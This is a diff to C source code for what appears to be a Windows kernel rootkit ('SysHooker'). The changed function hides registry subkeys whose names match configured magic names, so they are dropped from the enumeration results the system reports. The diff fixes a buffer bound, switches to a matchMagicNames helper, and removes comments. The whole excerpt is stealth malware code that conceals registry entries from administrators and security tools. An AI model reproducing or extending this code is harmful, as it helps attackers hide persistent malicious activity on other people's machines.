@@ -202,18 +202,16 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
             wchar_t SubKeyNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
 
             // ->NameLength / 2 , because the field is size in bytes but contains wchars (which consist of 2 bytes each)
-            for (size_t i = 0; i < subKeyInfo->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
+            for (size_t i = 0; i < subKeyInfo->NameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) { // - 1 to leave space for null-terminator
                 SubKeyNameBuffer[i] = subKeyInfo->Name[i];
             }
 
-            // TODO? - better function that evaluates whether a subkey should be hidden?
-            if (wcsstr(SubKeyNameBuffer, Settings.RegistryKeyMagicName)) {
+            if (matchMagicNames(SubKeyNameBuffer, (Target)TARGET_REGISTRY)) {
                 kprintf("[+] RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
                 *HideSubkeyIndexesCount += 1;
             }
             else {
-                //kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
-                (*OkSubkeyIndexes)[*OkSubkeyIndexesCount] = KeyIndex; // compiler says buffer overrun but I do not believe it
+                (*OkSubkeyIndexes)[*OkSubkeyIndexesCount] = KeyIndex;
                 *OkSubkeyIndexesCount += 1;
             }
         }
